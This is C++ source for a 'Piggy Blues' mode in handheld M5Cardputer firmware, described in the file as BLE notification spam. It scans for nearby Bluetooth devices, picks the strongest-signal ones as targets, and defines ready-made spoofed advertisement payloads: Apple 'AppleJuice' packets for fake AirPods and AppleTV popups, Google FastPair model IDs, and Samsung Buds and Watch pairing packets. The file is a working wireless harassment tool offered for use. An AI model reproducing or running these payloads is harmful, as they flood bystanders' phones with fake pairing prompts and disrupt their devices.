// Piggy Blues Mode implementation - BLE Notification Spam

#include "piggy_blues.h"
#include "../core/config.h"
#include "../core/xp.h"
#include "../core/wifi_utils.h"
#include "../core/network_recon.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include "../piglet/avatar.h"
#include "../audio/sfx.h"
#include <M5Cardputer.h>
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <algorithm>

// Include NimBLE internal header for direct GAP access
extern "C" {
#include "nimble/nimble/host/include/host/ble_gap.h"
}

// ============ Timing Constants (defaults, Config::ble() overrides) ============
static const uint16_t DEFAULT_BURST_INTERVAL_MS = 200;  // Time between advertisement bursts
static const uint16_t DEFAULT_ADV_DURATION_MS = 100;    // How long each advertisement runs
static const uint16_t BLE_STACK_SETTLE_MS = 50;         // Delay for BLE stack to settle (reduced for async)
static const uint16_t BLE_OP_DELAY_MS = 20;             // Short delay between BLE operations (reduced)
static const uint16_t BLE_ADV_MIN_INTERVAL = 32;        // 20ms (32 * 0.625ms)
static const uint16_t BLE_ADV_MAX_INTERVAL = 64;        // 40ms (64 * 0.625ms)
static const uint8_t  MAX_TARGETS = 50;                 // Maximum targets to track
static const uint8_t  MAX_ACTIVE_TARGETS = 4;           // Maximum active targets for payload selection
static const uint8_t  MAX_TARGETS_FOR_MOOD = 255;       // Cap for uint8_t mood parameter
static const uint32_t TARGET_STALE_TIMEOUT_MS = 10000;  // 10 seconds before target considered stale
static const uint8_t  REBOOT_CHANCE_PERCENT = 50;       // 0-100 chance to reboot on exit
static const uint16_t NO_REBOOT_XP_BONUS = 15;          // Bonus XP when no reboot happens

// UI Constants
static const uint16_t DIALOG_WIDTH = 200;               // Warning dialog width
static const uint16_t DIALOG_HEIGHT = 70;               // Warning dialog height
static const uint32_t DIALOG_TIMEOUT_MS = 5000;         // Warning dialog timeout
static const uint32_t MOOD_UPDATE_INTERVAL_MS = 3000;   // Mood phrase update interval

// Warm-up payload (31 bytes) to pre-allocate advertisement buffer
static const uint8_t ADV_WARMUP_PAYLOAD[] = {
    0x1d, 0x09, 'P','I','G','G','Y','-','B','L','U','E','S','-','W','A','R','M','U','P','-','B','U','F','F','E','R','-','0'
};

// Runtime config values (loaded from Config::ble())
static uint16_t cfgBurstInterval = DEFAULT_BURST_INTERVAL_MS;
static uint16_t cfgAdvDuration = DEFAULT_ADV_DURATION_MS;

// Static members
bool PiggyBluesMode::running = false;
bool PiggyBluesMode::confirmed = false;
uint32_t PiggyBluesMode::lastBurstTime = 0;
uint16_t PiggyBluesMode::burstInterval = 100;
bool PiggyBluesMode::scanRunning = false;
bool PiggyBluesMode::advertisingNow = false;
std::vector<BLETarget> PiggyBluesMode::targets;
uint8_t PiggyBluesMode::activeCount = 0;
uint32_t PiggyBluesMode::totalPackets = 0;
uint32_t PiggyBluesMode::appleCount = 0;
uint32_t PiggyBluesMode::androidCount = 0;
uint32_t PiggyBluesMode::samsungCount = 0;
uint32_t PiggyBluesMode::windowsCount = 0;

// BLE state synchronization
static portMUX_TYPE bleStateMux = portMUX_INITIALIZER_UNLOCKED;

bool PiggyBluesMode::getAdvertisingNow() {
    bool value;
    taskENTER_CRITICAL(&bleStateMux);
    value = advertisingNow;
    taskEXIT_CRITICAL(&bleStateMux);
    return value;
}

void PiggyBluesMode::setAdvertisingNow(bool value) {
    taskENTER_CRITICAL(&bleStateMux);
    advertisingNow = value;
    taskEXIT_CRITICAL(&bleStateMux);
}

bool PiggyBluesMode::getScanRunning() {
    bool value;
    taskENTER_CRITICAL(&bleStateMux);
    value = scanRunning;
    taskEXIT_CRITICAL(&bleStateMux);
    return value;
}

void PiggyBluesMode::setScanRunning(bool value) {
    taskENTER_CRITICAL(&bleStateMux);
    scanRunning = value;
    taskEXIT_CRITICAL(&bleStateMux);
}

// Reusable advertisement data to avoid heap churn in hot paths
static NimBLEAdvertisementData advDataCache;
static bool advCachePrimed = false;
static inline void primeAdvCache() {
    if (advCachePrimed) return;
    advDataCache.clearData();
    // Add max-size payload to force NimBLE's internal buffer allocation.
    // Keep the data — first real sendX() call will clearData() before setting payload.
    advDataCache.addData(ADV_WARMUP_PAYLOAD, sizeof(ADV_WARMUP_PAYLOAD));
    advCachePrimed = true;
}

// ============ Deferred Target System ============
// Scan callback sets pending target, update() processes in main thread
// Single-slot pattern (like OINK) - missing a few is acceptable
static portMUX_TYPE pendingTargetMux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool pendingTargetAdd = false;
static volatile bool pendingTargetBusy = false;
static BLETarget pendingTarget;

// Scan callbacks instance
static PiggyBluesScanCallbacks scanCallbacks;

// ============ Scan Callback Implementation ============
// Called from NimBLE task context - must be quick, no heavy processing

static BLEVendor identifyVendorFromPayload(const std::vector<uint8_t>& payload) {
    size_t idx = 0;
    // Add bounds checking to prevent out-of-bounds access
    while (idx + 1 < payload.size()) {
        uint8_t len = payload[idx];
        if (len == 0) {
            break;
        }
        // Ensure we don't go out of bounds when accessing payload[idx + len + 1]
        if (idx + len >= payload.size()) {
            break; // Prevent out-of-bounds access
        }
        size_t next = idx + len + 1;
        if (next > payload.size()) {
            break;
        }
        if (payload[idx + 1] == 0xFF) {  // Manufacturer data
            // Make sure we have at least 2 bytes for company ID
            if (len < 1) {
                idx = next;
                continue;
            }
            const uint8_t* data = payload.data() + idx + 2;
            size_t dataLen = len - 1;
            // Make sure we have at least 2 bytes for company ID
            if (dataLen < 2) {
                idx = next;
                continue;
            }
            return PiggyBluesMode::identifyVendor(data, dataLen);
        }
        idx = next;
    }
    return BLEVendor::UNKNOWN;
}

void PiggyBluesScanCallbacks::onResult(const NimBLEAdvertisedDevice* device) {
    // Called for each device found during continuous scan
    // Use deferred pattern: quick copy, process in main thread
    
    if (!device) return;
    if (PiggyBluesMode::getAdvertisingNow()) return;  // Skip during advertising (RF interference)
    
    // Extract info quickly
    BLETarget target;
    memcpy(target.addr, device->getAddress().getBase()->val, 6);
    target.rssi = device->getRSSI();
    target.lastSeen = millis();
    
    // Identify vendor from payload without heap allocations
    target.vendor = identifyVendorFromPayload(device->getPayload());
    
    // Queue for processing
    taskENTER_CRITICAL(&pendingTargetMux);
    if (!pendingTargetBusy && !pendingTargetAdd) {
        pendingTarget = target;
        pendingTargetAdd = true;
    }
    taskEXIT_CRITICAL(&pendingTargetMux);
}

void PiggyBluesScanCallbacks::onScanEnd(const NimBLEScanResults& results, int reason) {
    // Continuous scan shouldn't end unless stopped or error
    // NimBLE 2.x: stop() does NOT call onScanEnd, so this only fires on unexpected termination
    // If we're still running and not advertising, restart scan
    if (PiggyBluesMode::isRunning() && !PiggyBluesMode::getAdvertisingNow()) {
        // Mark scan as stopped so startContinuousScan() will restart it
        PiggyBluesMode::setScanRunning(false);
        PiggyBluesMode::startContinuousScan();
    }
}

// ============ New Continuous Scan Functions ============

void PiggyBluesMode::startContinuousScan() {
    if (getScanRunning()) return;
    
    NimBLEScan* pScan = NimBLEDevice::getScan();
    if (!pScan) {
        return;
    }
    
    pScan->setScanCallbacks(&scanCallbacks, false);  // false = don't delete old callbacks
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    pScan->setDuplicateFilter(false);  // See all advertisements for RSSI updates
    
    // Start continuous non-blocking scan
    // NimBLE 2.x: start(duration, callback, continuous) 
    // duration=0 means forever, continuous=true for real-time callbacks
    if (pScan->start(0, false, true)) {
        setScanRunning(true);
    }
}

void PiggyBluesMode::stopContinuousScan() {
    if (!getScanRunning()) return;
    
    NimBLEScan* pScan = NimBLEDevice::getScan();
    if (pScan && pScan->isScanning()) {
        pScan->stop();
        delay(BLE_OP_DELAY_MS);
    }
    setScanRunning(false);
}

void PiggyBluesMode::processTargets() {
    // Process any pending target from scan callback (deferred pattern)
    BLETarget newTarget;
    bool hasTarget = false;
    
    taskENTER_CRITICAL(&pendingTargetMux);
    if (pendingTargetAdd) {
        pendingTargetBusy = true;
        newTarget = pendingTarget;
        pendingTargetAdd = false;
        pendingTargetBusy = false;
        hasTarget = true;
    }
    taskEXIT_CRITICAL(&pendingTargetMux);
    
    if (!hasTarget) return;
    
    // Upsert into targets list
    upsertTarget(newTarget);
}

void PiggyBluesMode::upsertTarget(const BLETarget& target) {
    // Find existing or add new
    for (auto& t : targets) {
        if (memcmp(t.addr, target.addr, 6) == 0) {
            // Update existing - refresh RSSI and timestamp
            t.rssi = target.rssi;
            t.lastSeen = target.lastSeen;
            t.vendor = target.vendor;  // May have been UNKNOWN before
            return;
        }
    }
    
    // New target - add if room
    if (targets.size() < MAX_TARGETS) {
        targets.push_back(target);
    }
}

void PiggyBluesMode::ageOutStaleTargets() {
    uint32_t now = millis();
    size_t writeIdx = 0;
    
    // Compact the targets array without using erase() to avoid heap churn
    for (size_t readIdx = 0; readIdx < targets.size(); ++readIdx) {
        if (now - targets[readIdx].lastSeen <= TARGET_STALE_TIMEOUT_MS) {
            // Keep this target - move to write position if needed
            if (writeIdx != readIdx) {
                targets[writeIdx] = targets[readIdx];
            }
            ++writeIdx;
        }
    }
    
    // Truncate the vector to new size - this may still allocate but less frequently
    targets.resize(writeIdx);
}

void PiggyBluesMode::selectActiveTargets() {
    if (targets.empty()) {
        activeCount = 0;
        return;
    }
    
    // Partial sort — only need top 4 by RSSI (strongest first = closest)
    activeCount = min((size_t)4, targets.size());
    std::partial_sort(targets.begin(), targets.begin() + activeCount, targets.end(),
        [](const BLETarget& a, const BLETarget& b) {
            return a.rssi > b.rssi;
        });
}

// AppleJuice payloads - fake AirPods/AppleTV/etc popups
// Format: length, type (0xFF = manufacturer), Apple company ID (0x004C), device type, ...

// Long devices (audio) - 31 bytes each
static const uint8_t APPLE_AIRPODS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_POWERBEATS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_SOLO3[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_STUDIO3[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_AIRPODS_MAX[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_POWERBEATS_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_SOLO_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_AIRPODS_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_AIRPODS_GEN2[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_FLEX[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_STUDIO_BUDS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_FIT_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_AIRPODS_GEN3[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_AIRPODS_PRO_GEN2[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_STUDIO_BUDS_PLUS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_STUDIO_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_AIRPODS_PRO_GEN2_USBC[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_SOLO4[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x24, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_BEATS_SOLO_BUDS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x25, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_POWERBEATS_FIT[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x2e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t APPLE_AIRPODS_GEN4[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x2f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Short devices (AppleTV, setup, etc) - 23 bytes each - work at longer range
static const uint8_t APPLE_TV_PAIR[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_TV_NEW_USER[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_TV_APPLEID_SETUP[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_TV_WIRELESS_AUDIO[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_TV_HOMEKIT_SETUP[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_TV_KEYBOARD[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_SETUP_NEW_PHONE[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_TV_CONNECT_NETWORK[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_HOMEPOD_SETUP[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
static const uint8_t APPLE_TV_COLOR_BALANCE[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x14, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

// Long audio devices array
static const uint8_t* APPLE_DEVICES_LONG[] = {
    APPLE_AIRPODS, APPLE_POWERBEATS, APPLE_BEATS_SOLO3, APPLE_BEATS_STUDIO3,
    APPLE_AIRPODS_MAX, APPLE_POWERBEATS_PRO, APPLE_BEATS_SOLO_PRO, APPLE_AIRPODS_PRO,
    APPLE_AIRPODS_GEN2, APPLE_BEATS_FLEX, APPLE_BEATS_STUDIO_BUDS, APPLE_BEATS_FIT_PRO,
    APPLE_AIRPODS_GEN3, APPLE_AIRPODS_PRO_GEN2, APPLE_BEATS_STUDIO_BUDS_PLUS, APPLE_BEATS_STUDIO_PRO,
    APPLE_AIRPODS_PRO_GEN2_USBC, APPLE_BEATS_SOLO4, APPLE_BEATS_SOLO_BUDS, APPLE_POWERBEATS_FIT,
    APPLE_AIRPODS_GEN4
};
static const size_t APPLE_LONG_COUNT = sizeof(APPLE_DEVICES_LONG) / sizeof(APPLE_DEVICES_LONG[0]);

// Short AppleTV/setup devices array
static const uint8_t* APPLE_DEVICES_SHORT[] = {
    APPLE_TV_PAIR, APPLE_TV_NEW_USER, APPLE_TV_APPLEID_SETUP, APPLE_TV_WIRELESS_AUDIO,
    APPLE_TV_HOMEKIT_SETUP, APPLE_TV_KEYBOARD, APPLE_SETUP_NEW_PHONE, APPLE_TV_CONNECT_NETWORK,
    APPLE_HOMEPOD_SETUP, APPLE_TV_COLOR_BALANCE
};
static const size_t APPLE_SHORT_COUNT = sizeof(APPLE_DEVICES_SHORT) / sizeof(APPLE_DEVICES_SHORT[0]);

// Android FastPair model IDs - comprehensive list from various devices
static const uint32_t FASTPAIR_MODELS[] = {
    // Google devices
    0x000006,  // Google Pixel Buds
    0x000007,  // Android Auto
    0x000008,  // Foocorp Foophones
    0x00000A,  // Test - Anti-Spoofing
    0x00000B,  // Google Gphones
    0x00000C,  // Set Up Device (Google Gphones)
    0x000047,  // Arduino 101
    0x000048,  // Fast Pair Headphones
    0x000049,  // Fast Pair Headphones
    0x0582FD,  // Pixel Buds
    0x92BBBD,  // Pixel Buds
    
    // Sony devices
    0x00C95C,  // Sony WF-1000X
    0x01C95C,  // Sony WF-1000X
    0x02C95C,  // Sony WH-1000XM2
    0x01EEB4,  // Sony WH-1000XM4
    0x058D08,  // Sony WH-1000XM4
    0x2D7A23,  // Sony WF-1000XM4
    0xD446A7,  // Sony XM5
    0x07A41C,  // Sony WF-C700N
    
    // JBL devices
    0xF00200,  // JBL Everest 110GA
    0xF00207,  // JBL Everest 710GA
    0xF00209,  // JBL LIVE400BT
    0xF0020E,  // JBL LIVE500BT
    0xF00213,  // JBL LIVE650BTNC
    0x02D886,  // JBL REFLECT MINI NC
    0x02DD4F,  // JBL TUNE770NC
    0x02F637,  // JBL LIVE FLEX
    0x038CC7,  // JBL TUNE760NC
    0x04ACFC,  // JBL WAVE BEAM
    0x04AFB8,  // JBL TUNE 720BT
    0x054B2D,  // JBL TUNE125TWS
    0x05C452,  // JBL LIVE220BT
    0x0660D7,  // JBL LIVE770NC
    0x821F66,  // JBL Flip 6
    0xF52494,  // JBL Buds Pro
    0x718FA4,  // JBL Live 300TWS
    
    // Bose devices
    0x0000F0,  // Bose QuietComfort 35 II
    0x0100F0,  // Bose QuietComfort 35 II
    0xF00000,  // Bose QuietComfort 35 II
    0xCD8256,  // Bose NC 700
    
    // Samsung Galaxy devices
    0x0577B1,  // Galaxy S23 Ultra
    0x05A9BC,  // Galaxy S20+
    0x06AE20,  // Galaxy S21 5G
    
    // Others
    0x00AA91,  // Beoplay E8 2.0
    0x01AA91,  // Beoplay H9 3rd Generation
    0x02AA91,  // B&O Earset
    0x03AA91,  // B&O Beoplay H8i
    0x04AA91,  // Beoplay H4
    0x038F16,  // Beats Studio Buds
    0x72FB00,  // Soundcore Spirit Pro GVA
    0x00A168,  // boAt Airdopes 621
    0x00AA48,  // Jabra Elite 2
    0x0E30C3,  // Razer Hammerhead TWS
    0x72EF8D,  // Razer Hammerhead TWS X
    0x057802,  // TicWatch Pro 5
    0x05A963,  // WONDERBOOM 3
    0xB37A62,  // Tesla
    
    // LG devices
    0xF00300,  // LG HBS-835S
    0xF00304,  // LG HBS-1010
    0xF00305,  // LG HBS-1500
    0xF00309   // LG HBS-2000
};
static const size_t FASTPAIR_MODEL_COUNT = sizeof(FASTPAIR_MODELS) / sizeof(FASTPAIR_MODELS[0]);

// Samsung BLE spam payloads (Galaxy Buds, Watch, etc)
// Format: length, 0xFF (manufacturer data), Samsung company ID 0x0075, device data
static const uint8_t SAMSUNG_BUDS_PRO[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t SAMSUNG_BUDS_LIVE[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x01, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t SAMSUNG_BUDS_FE[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x06, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t SAMSUNG_BUDS2[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x04, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t SAMSUNG_BUDS2_PRO[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x0e, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t SAMSUNG_BUDS_PLUS[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x02, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
// Samsung Watch pairing (causes watch pair popup spam)
static const uint8_t SAMSUNG_WATCH4[] = {0x15, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t SAMSUNG_WATCH5[] = {0x15, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x02, 0xff, 0x00, 0x00, 0x43, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t SAMSUNG_WATCH5_PRO[] = {0x15, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x03, 0xff, 0x00, 0x00, 0x43, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t SAMSUNG_WATCH6[] = {0x15, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x04, 0xff, 0x00, 0x00, 0x43, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

static const uint8_t* SAMSUNG_PAYLOADS[] = {
    SAMSUNG_BUDS_PRO, SAMSUNG_BUDS_LIVE, SAMSUNG_BUDS_FE, SAMSUNG_BUDS2,
    SAMSUNG_BUDS2_PRO, SAMSUNG_BUDS_PLUS, SAMSUNG_WATCH4, SAMSUNG_WATCH5,
    SAMSUNG_WATCH5_PRO, SAMSUNG_WATCH6
};
static const size_t SAMSUNG_PAYLOAD_COUNT = sizeof(SAMSUNG_PAYLOADS) / sizeof(SAMSUNG_PAYLOADS[0]);

// Windows SwiftPair format
// Uses Microsoft vendor ID 0x0006 with SwiftPair service data

// BLE advertising state
static NimBLEAdvertising* pAdvertising = nullptr;

// Update timing state
static uint32_t advertisingStartTime = 0;
static uint32_t lastMoodUpdateTime = 0;

// Last target info for mood display
static BLEVendor lastVendorUsed = BLEVendor::UNKNOWN;
static int8_t lastRssiUsed = 0;

void PiggyBluesMode::init() {
    running = false;
    confirmed = false;
    lastBurstTime = 0;
    setScanRunning(false);
    setAdvertisingNow(false);
    
    // Load config values
    cfgBurstInterval = Config::ble().burstInterval;
    cfgAdvDuration = Config::ble().advDuration;
    
    // Validate: advDuration must not exceed burstInterval (prevents perpetual lag)
    if (cfgAdvDuration > cfgBurstInterval) {
        cfgAdvDuration = cfgBurstInterval;
    }
    
    burstInterval = cfgBurstInterval;
    targets.clear();
    targets.reserve(MAX_TARGETS);
    activeCount = 0;
    totalPackets = 0;
    appleCount = 0;
    androidCount = 0;
    samsungCount = 0;
    windowsCount = 0;
    
    // Reset deferred target state
    pendingTargetAdd = false;
    pendingTargetBusy = false;
    
    // Reset timing state
    lastMoodUpdateTime = 0;
    advertisingStartTime = 0;

    // Pre-allocate advertisement buffer to avoid hot-path allocations
    primeAdvCache();
}

